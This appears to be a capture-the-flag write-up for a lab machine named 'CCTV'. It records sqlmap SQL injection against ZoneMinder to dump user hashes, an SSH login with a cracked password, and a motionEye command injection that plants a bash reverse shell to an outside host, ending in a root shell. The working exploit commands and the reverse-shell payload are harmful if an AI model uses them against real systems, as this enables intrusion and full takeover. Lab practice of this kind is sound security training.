---
title: CCTV
---




![alt text](image.png)


![alt text](image-1.png)



[https://zoneminder.readthedocs.io/en/latest/userguide/gettingstarted.html](https://zoneminder.readthedocs.io/en/latest/userguide/gettingstarted.html)

![alt text](image-2.png)


![alt text](image-3.png)



![alt text](image-4.png)



![alt text](image-5.png)


follow guideline https://github.com/Gh0s7Ops/CVE-2024-51482-Multi-Stage-Surveillance-System-Exploit


```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 sqlmap-dev]$ python3 sqlmap.py -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=ilc50qj5ke3rftgg5c41ans8gf" -p tid --dbms=mysql --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.2.18#dev}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:24:25 /2026-03-09/

[20:24:26] [INFO] testing connection to the target URL
[20:24:27] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:24:27] [INFO] testing if the target URL content is stable
[20:24:28] [INFO] target URL content is stable
[20:24:29] [WARNING] heuristic (basic) test shows that GET parameter 'tid' might not be injectable
[20:24:29] [INFO] testing for SQL injection on GET parameter 'tid'
[20:24:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:24:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:24:39] [INFO] testing 'Generic inline queries'
[20:24:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:24:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:24:43] [WARNING] time-based comparison requires larger statistical model, please wait.......... (done)
[20:25:06] [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:25:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:25:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:25:23] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[20:25:48] [INFO] checking if the injection point on GET parameter 'tid' is a false positive
GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8949 FROM (SELECT(SLEEP(5)))FlsE)
---
[20:26:13] [INFO] the back-end DBMS is MySQL
[20:26:13] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[20:26:20] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 59 times
[20:26:20] [INFO] fetched data logged to text files under '/home/07cf599c8311a84b1d8c2ae8xK/.local/share/sqlmap/output/cctv.htb'

[*] ending @ 20:26:20 /2026-03-09/
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 sqlmap-dev]$ python3 sqlmap.py -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=ilc50qj5ke3rftgg5c41ans8gf" -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.2.18#dev}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:34:29 /2026-03-09/

[20:34:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8949 FROM (SELECT(SLEEP(5)))FlsE)
---
[20:34:32] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[20:35:02] [INFO] confirming MySQL
[20:35:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[20:35:15] [INFO] adjusting time delay to 4 seconds due to good response times
[20:35:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 8.0.0
[20:35:15] [INFO] fetching entries of column(s) 'Username' for table 'Users' in database 'zm'
[20:35:15] [INFO] fetching number of column(s) 'Username' entries for table 'Users' in database 'zm'
[20:35:15] [INFO] retrieved: 3
[20:35:35] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[20:36:24] [ERROR] invalid character detected. retrying..
[20:36:24] [WARNING] increasing time delay to 5 seconds
admin
[20:38:07] [INFO] retrieved: mark
[20:39:25] [INFO] retrieved: superadmin
Database: zm
Table: Users
[3 entries]
+------------+
| Username   |
+------------+
| admin      |
| mark       |
| superadmin |
+------------+

[20:42:53] [INFO] table 'zm.Users' dumped to CSV file '/home/07cf599c8311a84b1d8c2ae8xK/.local/share/sqlmap/output/cctv.htb/dump/zm/Users.csv'
[20:42:53] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 197 times
[20:42:53] [INFO] fetched data logged to text files under '/home/07cf599c8311a84b1d8c2ae8xK/.local/share/sqlmap/output/cctv.htb'

[*] ending @ 20:42:53 /2026-03-09/
```


```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 sqlmap-dev]$ python3 sqlmap.py -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=ilc50qj5ke3rftgg5c41ans8gf" -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.2.18#dev}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:42:42 /2026-03-09/

[20:42:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8949 FROM (SELECT(SLEEP(5)))FlsE)
---
[20:42:44] [INFO] testing MySQL
[20:42:44] [INFO] confirming MySQL
[20:42:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 8.0.0
[20:42:44] [INFO] fetching entries of column(s) 'Password' for table 'Users' in database 'zm'
[20:42:44] [INFO] fetching number of column(s) 'Password' entries for table 'Users' in database 'zm'
[20:42:44] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[20:43:14] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
1
[20:43:25] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[20:43:57] [INFO] adjusting time delay to 4 seconds due to good response times
$2y
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
$10$prZGnazejKcuTv5bKNexXOgfLfy
[20:55:37] [ERROR] invalid character detected. retrying..
[20:55:37] [WARNING] increasing time delay to 5 seconds
Qaok0hq07LW7AJ/QNqZolbXKfFG.
Database: zm
Table: Users
[1 entry]
+--------------------------------------------------------------+
| Password                                                     |
+--------------------------------------------------------------+
| $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+--------------------------------------------------------------+

[21:07:49] [INFO] table 'zm.Users' dumped to CSV file '/home/07cf599c8311a84b1d8c2ae8xK/.local/share/sqlmap/output/cctv.htb/dump/zm/Users.csv'
[21:07:49] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 533 times
[21:07:49] [INFO] fetched data logged to text files under '/home/07cf599c8311a84b1d8c2ae8xK/.local/share/sqlmap/output/cctv.htb'

[*] ending @ 21:07:49 /2026-03-09/
```

hashcat


ssh as `mark:opensesame`:


```bash-shell
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 cctv]$ ssh mark@cctv.htb
mark@cctv.htb's password:
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 11 Mar 02:56:43 UTC 2026

  System load:           0.21
  Usage of /:            72.5% of 8.70GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             248
  Users logged in:       0
  IPv4 address for eth0: 10.129.4.203
  IPv6 address for eth0: dead:beef::250:56ff:feb0:338f

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
mark@cctv:~$
```



```bash
mark@cctv:~$ ss -tulpn
Netid                        State                         Recv-Q                        Send-Q                                               Local Address:Port                                                Peer Address:Port                       Process
udp                          UNCONN                        0                             0                                                       127.0.0.54:53                                                       0.0.0.0:*
udp                          UNCONN                        0                             0                                                    127.0.0.53%lo:53                                                       0.0.0.0:*
udp                          UNCONN                        0                             0                                                          0.0.0.0:68                                                       0.0.0.0:*
tcp                          LISTEN                        0                             70                                                       127.0.0.1:33060                                                    0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                     127.0.0.1:8554                                                     0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                     127.0.0.1:8888                                                     0.0.0.0:*
tcp                          LISTEN                        0                             128                                                      127.0.0.1:8765                                                     0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                     127.0.0.1:9081                                                     0.0.0.0:*
tcp                          LISTEN                        0                             151                                                      127.0.0.1:3306                                                     0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                 127.0.0.53%lo:53                                                       0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                     127.0.0.1:1935                                                     0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                       0.0.0.0:22                                                       0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                    127.0.0.54:53                                                       0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                     127.0.0.1:7999                                                     0.0.0.0:*
tcp                          LISTEN                        0                             4096                                                          [::]:22                                                          [::]:*
tcp                          LISTEN                        0                             511                                                              *:80                                                             *:*
```


```bash
mark@cctv:~$ cat /etc/systemd/system/motioneye.service
[Unit]
Description=motionEye Server
After=network.target local-fs.target remote-fs.target

[Service]
User=root
RuntimeDirectory=motioneye
LogsDirectory=motioneye
StateDirectory=motioneye
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
Restart=on-abort

[Install]
WantedBy=multi-user.target
```



```bash
mark@cctv:~$ cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

```bash
ssh -N -L 8765:127.0.0.1:8765 mark@cctv.htb
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 cctv]$ ssh -N -L 8765:127.0.0.1:8765 mark@cctv.htb
mark@cctv.htb's password:

```

because I am on a VPS:

```bash
ssh -N -L 8765:127.0.0.1:8765 07cf599c8311a84b1d8c2ae8xK@62.84.184.210 -p 65199
```

```bash
 ✘ pedant@MOZHARs-MacBook-Pro-2  ~  ssh -N -L 8765:127.0.0.1:8765 07cf599c8311a84b1d8c2ae8xK@62.84.184.210 -p 65199
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(07cf599c8311a84b1d8c2ae8xK@62.84.184.210) Password:
(07cf599c8311a84b1d8c2ae8xK@62.84.184.210) Verification code:
```

visit http://127.0.0.1:8765/

![alt text](image-6.png)


view page-source

![alt text](image-7.png)

![alt text](image-8.png)


https://vulners.com/cve/CVE-2025-60787


```bash
curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
```

```bash-session
mark@cctv:~$ curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
picture_output = on
Done
```

```bash
curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.126%2F1337%200%3E%261%27%29"
```

```bash-shell
mark@cctv:~$ curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.126%2F1337%200%3E%261%27%29"
picture_filename = $(bash -c 'bash -i >& /dev/tcp/10.10.16.126/1337 0>&1')
Done
```


start listener:

```bash
rlwrap nc -nvlp 1337
```

```bash-shell
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 cctv]$ rlwrap nc -nvlp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

```

```bash-shell
mark@cctv:~$ curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
emulate_motion = on
Done
```

```bash-shell
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 cctv]$ rlwrap nc -nvlp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.4.203.
Ncat: Connection from 10.129.4.203:40628.
bash: cannot set terminal process group (5274): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye#
```

read `/root/root.txt`:

```bash
cat /root/root.txt
```

```bash-shell
root@cctv:/etc/motioneye# cat /root/root.txt
cat /root/root.txt
26cca02fb9fca50d5e84b38cd27d44d6
```